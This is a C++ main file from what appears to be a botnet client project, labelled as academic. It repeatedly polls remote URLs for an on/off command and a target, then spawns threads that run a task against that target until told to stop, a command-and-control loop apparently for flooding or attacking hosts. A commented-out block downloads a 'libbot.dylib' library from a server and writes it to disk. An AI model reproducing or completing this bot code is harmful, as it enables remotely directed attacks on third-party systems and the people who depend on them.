// This is a personal academic project. Dear PVS-Studio, please check it.
// PVS-Studio Static Code Analyzer for C, C++, C#, and Java: http://www.viva64.com

#include <iostream>
#include <string>
#include <mutex>
#include <map>
#include <chrono>
#include <thread>
#include <cpr/cpr.h>
#include <unistd.h>

#include "managing_threads.hpp"
#include "task_for_thread.hpp"
#include "parse_config.hpp"

int main(int argc, char *argv[])
{
    const std::string path_to_cfg = "./data/config.cfg";
    std::map<std::string, std::string> config_map = parse_config(path_to_cfg);
    const std::string num_of_threads = config_map["num_of_threads"];
    const std::string connect = config_map["connect"];
    std::string get_target = config_map["get_target"];

    bool status = false;

    // cpr::Response r = cpr::Get(cpr::Url{"http://localhost:8080/get-library/libbot.dylib"},
    //                            cpr::Header{{"Accept", "application/octet-stream"}});

    // std::ofstream outfile("libbot.dylib", std::ofstream::binary);
    // outfile.write(r.text.c_str(), r.text.length());
    // outfile.close();
    // std::cout << "Library downloaded successfully" << std::endl;

    while (true)
    {
        cpr::Response target = cpr::Get(cpr::Url{get_target});
        cpr::Response connect_status = cpr::Get(cpr::Url{connect});
        std::cout << target.text << " : " << connect_status.text << std::endl;
        if (connect_status.text == "true")
        {
            std::cout << "Connected" << std::endl;
            status = true;
            cpr::Response target = cpr::Get(cpr::Url{get_target});
            std::cout << target.text << std::endl;
            std::thread t = std::thread([&]()
                                        { managind_threads(task_for_thread, std::stoi(num_of_threads), target.text, std::ref(status)); });
            while (connect_status.text != "false")
            {
                sleep(5);
                connect_status = cpr::Get(cpr::Url{connect});
            }
            status = false;
            t.join();
            connect_status = cpr::Get(cpr::Url{connect});
        }
        else if (connect_status.text == "false")
        {
            std::cout << "Ready to connect" << std::endl;
            status = false;
            cpr::Response target = cpr::Get(cpr::Url{get_target});
            connect_status = cpr::Get(cpr::Url{connect});
        }
        sleep(5);
    }

    return 0;
}
